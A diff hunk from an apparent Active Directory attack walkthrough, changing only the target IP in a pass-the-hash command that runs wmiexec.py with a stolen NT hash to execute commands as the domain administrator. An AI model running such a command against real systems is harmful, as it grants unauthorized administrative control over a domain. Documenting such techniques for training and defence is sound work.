@@ -94,7 +94,7 @@ Use the obtained NT hash to execute commands as the domain administrator using `
 
 ```bash
 # Pass-The-Hash to execute as the domain administrator
-wmiexec.py -hashes :<nt_hash> spencer/op@10.0.0.18
+wmiexec.py -hashes :<nt_hash> spencer/op@10.0.0.178
 ```
 
 ### Conclusion:
